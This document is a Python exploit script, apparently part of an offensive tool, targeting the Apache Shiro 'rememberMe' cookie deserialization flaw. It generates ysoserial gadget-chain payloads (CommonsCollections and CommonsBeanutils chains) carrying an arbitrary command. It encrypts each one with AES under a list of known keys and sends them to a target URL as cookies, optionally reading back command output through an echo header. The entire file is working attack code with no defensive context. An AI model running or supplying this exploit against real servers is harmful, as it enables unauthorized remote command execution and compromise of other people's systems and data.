#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
File:   :   Exploit.py
Time    :   2021/09/15 17:18:21
Author  :   Hack3rHan
Contact :   Hack3rHan@protonmail.com
"""
import base64
import re
import requests
import uuid

from colorama import Fore
from core.YsoserialPayloads import YsoserialPayloads
from Crypto.Cipher import AES


class Exploit(object):
    """
    Exploit(url:str, cmd:str, echo:bool)
    The Following Functions are available:
        send_noecho_exp(self)
        send_echo_exp(self) -> bytes    # This is a generator
    """
    _ysoserial_payloads = YsoserialPayloads()
    _echo_header_name = _ysoserial_payloads.get_evil_header()
    _unencrypted_payloads = []
    _encrypted_payloads = []
    _noecho_payload_names = [
        'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3',
        'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6',
        'CommonsCollections7', 'CommonsCollections8', 'CommonsCollections9',
        'CommonsCollections10', 'CommonsCollectionsK1', 'CommonsCollectionsK2',
        'CommonsCollectionsK3', 'CommonsCollectionsK4', 'CommonsBeanutils1'
    ]
    _echo_payload_names = [
        'CommonsCollectionsK1TomcatEcho', 'CommonsCollectionsK2TomcatEcho'
    ]
    _aes_keys = []

    def __init__(self, url: str, cmd: str, echo: bool = False):
        self.url = url
        self.cmd = cmd
        self.echo = echo
        self._gen_unencrypted_payloads()
        self._encrypt_payloads()

    def run(self):
        html_pattern = re.compile('<.*?>')
        if self.echo:
            for resp in self.send_echo_exp():
                if html_pattern.search(resp):
                    continue
                else:
                    print(resp)
        else:
            self.send_noecho_exp()

    def _gen_unencrypted_payloads(self):
        if self.echo:
            payload_names = self._echo_payload_names
        else:
            payload_names = self._noecho_payload_names

        for payload_name in payload_names:
            try:
                unencrypted_payload = self._ysoserial_payloads.get_payload(
                    cmd=self.cmd, payload=payload_name
                )
            except Exception:
                print(Fore.RED + '[!] ERROR: Do you forget to set the cmd ?')
                exit()

            if not unencrypted_payload:
                continue
            self._unencrypted_payloads.append(unencrypted_payload)
    
    def _get_aes_keys(self):
        with open('data/keys.enable.txt', 'r') as key_file:
            key = key_file.readline()
            while key:
                self._aes_keys.append(key)
                key = key_file.readline()

    def _encrypt_payloads(self):
        bs = AES.block_size
        mode = AES.MODE_CBC

        self._get_aes_keys()

        def pad(s):
            return s + ((bs - len(s) % bs) * chr(bs - len(s) % bs)).encode()

        for key in self._aes_keys:
            for unencrypted_payload in self._unencrypted_payloads:
                iv = uuid.uuid4().bytes
                encryptor = AES.new(base64.b64decode(key), mode, iv)
                unencrypted_payload = pad(
                    base64.b16decode(unencrypted_payload.upper())
                )
                encrypted_payload = base64.b64encode(
                    iv + encryptor.encrypt(unencrypted_payload)
                )
                self._encrypted_payloads.append(encrypted_payload)

    def send_noecho_exp(self) -> None:
        print(Fore.GREEN + '[*] INFO: Sending payloads, remember, there is no echo !')
        for payload in self._encrypted_payloads:
            cookies = {'rememberMe': payload.decode('utf-8')}
            try:
                requests.get(self.url, cookies=cookies)
            except Exception as err:
                print(Fore.RED + '[!] ERROR: {} HTTP Request Connect Error.'.format(err))

    def send_echo_exp(self) -> str:
        print(Fore.GREEN + '[*] INFO: Sending echo payloads...')
        print(Fore.WHITE)
        for payload in self._encrypted_payloads:
            headers = {
                self._echo_header_name: self.cmd,
                'Cookie': 'rememberMe={}'.format(payload.decode('utf-8')),
                'Connection': 'close'
            }
            try:
                resp = requests.get(self.url, headers=headers, timeout=8, verify=False)
            except Exception:
                continue
            yield resp.text
